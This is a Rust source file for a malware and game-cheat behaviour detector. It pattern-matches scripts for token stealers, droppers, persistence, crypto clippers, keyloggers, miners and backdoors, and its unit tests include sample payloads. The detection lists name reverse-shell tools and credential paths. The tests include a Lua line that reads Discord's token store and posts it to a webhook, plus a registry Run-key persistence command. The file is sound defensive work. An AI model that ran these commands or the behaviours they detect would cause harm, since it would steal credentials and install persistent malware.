//! Behavior detection for scripts targeting cheat loaders and malware patterns.

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Category of detected behavior.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum BehaviorCategory {
    Stealer,
    Dropper,
    Persistence,
    Miner,
    Keylogger,
    Clipper,
    Backdoor,
    CheatLoader,
    CheatInjector,
}

/// A behavior detected in a script with confidence and evidence.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectedBehavior {
    /// Name of the behavior pattern.
    pub name: String,
    /// Category classification.
    pub category: BehaviorCategory,
    /// Confidence that the detection is correct (0.0 - 1.0).
    pub confidence: f64,
    /// Evidence strings that triggered the detection.
    pub evidence: Vec<String>,
    /// Whether this behavior is related to game cheats (not necessarily malicious).
    pub is_cheat_related: bool,
}

/// Detects malicious and cheat-related behaviors in script content.
#[derive(Debug, Clone)]
pub struct BehaviorDetector {
    wallet_regex: Regex,
    webhook_regex: Regex,
    discord_path_regex: Regex,
}

impl Default for BehaviorDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl BehaviorDetector {
    /// Create a new `BehaviorDetector`.
    pub fn new() -> Self {
        Self {
            // Bitcoin, Ethereum, Litecoin wallet address patterns
            wallet_regex: Regex::new(
                r"(?:bc1[a-zA-HJ-NP-Z0-9]{25,39}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40}|L[a-km-zA-HJ-NP-Z1-9]{26,33})",
            )
            .expect("valid wallet regex"),
            webhook_regex: Regex::new(
                r#"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"#,
            )
            .expect("valid webhook regex"),
            discord_path_regex: Regex::new(
                r#"(?i)(?:%appdata%|appdata)[/\\]+discord"#,
            )
            .expect("valid discord path regex"),
        }
    }

    /// Detect all behaviors in the given script content.
    pub fn detect_behaviors(&self, script: &str) -> Vec<DetectedBehavior> {
        let mut detected = Vec::new();

        self.detect_token_stealer(script, &mut detected);
        self.detect_file_dropper(script, &mut detected);
        self.detect_persistence(script, &mut detected);
        self.detect_crypto_clipper(script, &mut detected);
        self.detect_webhook_exfil(script, &mut detected);
        self.detect_keylogger(script, &mut detected);
        self.detect_cheat_loader(script, &mut detected);
        self.detect_cheat_injector(script, &mut detected);
        self.detect_miner(script, &mut detected);
        self.detect_backdoor(script, &mut detected);

        detected
    }

    /// Detect token and cookie stealing patterns.
    fn detect_token_stealer(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();
        let mut score: f64 = 0.0;

        // Discord token paths
        if self.discord_path_regex.is_match(script) {
            evidence.push("References Discord appdata path".to_string());
            score += 0.3;
        }

        // LevelDB access (Discord token storage)
        if script.contains("Local Storage/leveldb") || script.contains("leveldb") {
            evidence.push("Accesses LevelDB storage (token location)".to_string());
            score += 0.3;
        }

        // Browser cookie paths
        let cookie_patterns = [
            "Cookies",
            "Login Data",
            "Web Data",
            "chrome",
            "firefox",
            "brave",
        ];
        for pat in &cookie_patterns {
            if script.to_lowercase().contains(&pat.to_lowercase())
                && (script.contains("readfile") || script.contains("io.open") || script.contains("ReadAllText"))
            {
                evidence.push(format!("Reads browser data: {}", pat));
                score += 0.2;
            }
        }

        // Roblox executor token theft
        if script.contains("getgenv().token") || script.contains("getgenv().Token") {
            evidence.push("Accesses executor environment token".to_string());
            score += 0.4;
        }

        if !evidence.is_empty() && score >= 0.3 {
            results.push(DetectedBehavior {
                name: "Token/Cookie Stealer".to_string(),
                category: BehaviorCategory::Stealer,
                confidence: score.min(1.0),
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect file dropper patterns (writing executables to disk).
    fn detect_file_dropper(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();
        let mut score: f64 = 0.0;

        let dangerous_extensions = [".exe", ".dll", ".bat", ".cmd", ".scr", ".pif", ".vbs"];

        for ext in &dangerous_extensions {
            if script.contains("writefile") && script.contains(ext) {
                evidence.push(format!("writefile() targeting {} extension", ext));
                score += 0.5;
            }
            if script.contains("WriteAllBytes") && script.contains(ext) {
                evidence.push(format!("WriteAllBytes() targeting {} extension", ext));
                score += 0.5;
            }
        }

        if !evidence.is_empty() {
            results.push(DetectedBehavior {
                name: "File Dropper".to_string(),
                category: BehaviorCategory::Dropper,
                confidence: score.min(1.0),
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect persistence establishment patterns.
    fn detect_persistence(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();
        let mut score: f64 = 0.0;

        // Registry Run key
        if script.contains("CurrentVersion\\Run") || script.contains("CurrentVersion/Run") {
            evidence.push("References registry Run key for auto-start".to_string());
            score += 0.5;
        }

        // Startup folder
        if script.contains("Startup") && (script.contains("copy") || script.contains("writefile")) {
            evidence.push("Copies file to Startup folder".to_string());
            score += 0.4;
        }

        // Scheduled tasks via os.execute
        if script.contains("os.execute") && script.contains("schtasks") {
            evidence.push("Creates scheduled task via os.execute".to_string());
            score += 0.5;
        }

        // Generic schtasks reference
        if script.contains("schtasks /create") {
            evidence.push("Creates a scheduled task".to_string());
            score += 0.4;
        }

        if !evidence.is_empty() {
            results.push(DetectedBehavior {
                name: "Persistence Mechanism".to_string(),
                category: BehaviorCategory::Persistence,
                confidence: score.min(1.0),
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect crypto clipper patterns (clipboard monitoring + wallet replacement).
    fn detect_crypto_clipper(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();
        let mut score: f64 = 0.0;

        let has_clipboard = script.contains("GetClipboard")
            || script.contains("SetClipboard")
            || script.contains("clipboard");

        let has_wallet = self.wallet_regex.is_match(script);

        if has_clipboard {
            evidence.push("Accesses clipboard".to_string());
            score += 0.3;
        }

        if has_wallet {
            evidence.push("Contains cryptocurrency wallet address pattern".to_string());
            score += 0.3;
        }

        if has_clipboard && has_wallet {
            score += 0.3; // Both together is very suspicious
            evidence.push("Clipboard access combined with wallet address - likely clipper".to_string());
        }

        if score >= 0.5 {
            results.push(DetectedBehavior {
                name: "Crypto Clipper".to_string(),
                category: BehaviorCategory::Clipper,
                confidence: score.min(1.0),
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect webhook-based data exfiltration.
    fn detect_webhook_exfil(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();

        let has_webhook = self.webhook_regex.is_match(script);
        let has_post = script.contains("HttpPost")
            || script.contains("PostAsync")
            || script.contains("request(");

        if has_webhook {
            evidence.push("Contains Discord webhook URL".to_string());
        }
        if has_post {
            evidence.push("Makes POST requests".to_string());
        }

        if has_webhook && has_post {
            results.push(DetectedBehavior {
                name: "Webhook Data Exfiltration".to_string(),
                category: BehaviorCategory::Stealer,
                confidence: 0.9,
                evidence,
                is_cheat_related: false,
            });
        } else if has_webhook {
            results.push(DetectedBehavior {
                name: "Webhook Data Exfiltration".to_string(),
                category: BehaviorCategory::Stealer,
                confidence: 0.6,
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect keylogger patterns.
    fn detect_keylogger(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();
        let mut score: f64 = 0.0;

        let keylog_patterns = [
            "UserInputService",
            "InputBegan",
            "KeyDown",
            "GetAsyncKeyState",
            "SetWindowsHookEx",
            "WH_KEYBOARD",
            "keylog",
        ];

        for pat in &keylog_patterns {
            if script.contains(pat) {
                evidence.push(format!("References input hooking: {}", pat));
                score += 0.3;
            }
        }

        // Key logging to file
        if (script.contains("InputBegan") || script.contains("KeyDown"))
            && (script.contains("writefile") || script.contains("appendfile"))
        {
            evidence.push("Captures keystrokes and writes to file".to_string());
            score += 0.4;
        }

        if score >= 0.3 {
            results.push(DetectedBehavior {
                name: "Keylogger".to_string(),
                category: BehaviorCategory::Keylogger,
                confidence: score.min(1.0),
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect cheat loader patterns (loadstring + HttpGet). These are NOT malicious.
    fn detect_cheat_loader(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();

        let has_loadstring = script.contains("loadstring");
        let has_http = script.contains("HttpGet") || script.contains("GetAsync");
        let has_game_service = script.contains("game:GetService");

        if has_loadstring && has_http {
            evidence.push("Uses loadstring + HttpGet pattern (typical cheat loader)".to_string());
        }
        if has_game_service {
            evidence.push("Uses game:GetService (Roblox API)".to_string());
        }

        if has_loadstring && has_http {
            results.push(DetectedBehavior {
                name: "Cheat Loader".to_string(),
                category: BehaviorCategory::CheatLoader,
                confidence: 0.85,
                evidence,
                is_cheat_related: true,
            });
        }
    }

    /// Detect cheat injector patterns (DLL injection API references). NOT malicious.
    fn detect_cheat_injector(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();

        let injection_apis = [
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreateRemoteThread",
            "NtWriteVirtualMemory",
            "LoadLibraryA",
        ];

        for api in &injection_apis {
            if script.contains(api) {
                evidence.push(format!("References DLL injection API: {}", api));
            }
        }

        if !evidence.is_empty() {
            results.push(DetectedBehavior {
                name: "Cheat Injector".to_string(),
                category: BehaviorCategory::CheatInjector,
                confidence: 0.7,
                evidence,
                is_cheat_related: true,
            });
        }
    }

    /// Detect crypto miner patterns.
    fn detect_miner(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();

        let miner_patterns = [
            "stratum+tcp://",
            "xmrig",
            "minergate",
            "coinhive",
            "cryptonight",
            "hashrate",
        ];

        for pat in &miner_patterns {
            if script.to_lowercase().contains(&pat.to_lowercase()) {
                evidence.push(format!("References mining: {}", pat));
            }
        }

        if !evidence.is_empty() {
            results.push(DetectedBehavior {
                name: "Crypto Miner".to_string(),
                category: BehaviorCategory::Miner,
                confidence: 0.8,
                evidence,
                is_cheat_related: false,
            });
        }
    }

    /// Detect backdoor patterns (reverse shell, remote access).
    fn detect_backdoor(&self, script: &str, results: &mut Vec<DetectedBehavior>) {
        let mut evidence = Vec::new();

        let backdoor_patterns = [
            "reverse_tcp",
            "bind_tcp",
            "/bin/sh",
            "cmd.exe /c",
            "nc -e",
            "ncat",
            "socket.connect",
        ];

        for pat in &backdoor_patterns {
            if script.contains(pat) {
                evidence.push(format!("References remote access pattern: {}", pat));
            }
        }

        if !evidence.is_empty() {
            results.push(DetectedBehavior {
                name: "Backdoor / Remote Access".to_string(),
                category: BehaviorCategory::Backdoor,
                confidence: 0.7,
                evidence,
                is_cheat_related: false,
            });
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_detect_cheat_loader() {
        let detector = BehaviorDetector::new();
        let script = r#"
            loadstring(game:HttpGet("https://raw.githubusercontent.com/user/repo/main/cheat.lua"))()
        "#;
        let behaviors = detector.detect_behaviors(script);
        let cheat = behaviors.iter().find(|b| b.category == BehaviorCategory::CheatLoader);
        assert!(cheat.is_some());
        assert!(cheat.unwrap().is_cheat_related);
    }

    #[test]
    fn test_detect_stealer() {
        let detector = BehaviorDetector::new();
        let script = r#"
            local path = os.getenv("APPDATA") .. "/discord/Local Storage/leveldb"
            local data = readfile(path)
            HttpPost("https://discord.com/api/webhooks/123/abc", data)
        "#;
        let behaviors = detector.detect_behaviors(script);
        let stealer = behaviors.iter().any(|b| b.category == BehaviorCategory::Stealer);
        assert!(stealer);
    }

    #[test]
    fn test_detect_persistence() {
        let detector = BehaviorDetector::new();
        let script = r#"
            os.execute('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v malware /d "C:\\malware.exe"')
        "#;
        let behaviors = detector.detect_behaviors(script);
        let persist = behaviors.iter().any(|b| b.category == BehaviorCategory::Persistence);
        assert!(persist);
    }

    #[test]
    fn test_detect_dropper() {
        let detector = BehaviorDetector::new();
        let script = r#"writefile("payload.exe", data)"#;
        let behaviors = detector.detect_behaviors(script);
        let dropper = behaviors.iter().any(|b| b.category == BehaviorCategory::Dropper);
        assert!(dropper);
    }
}
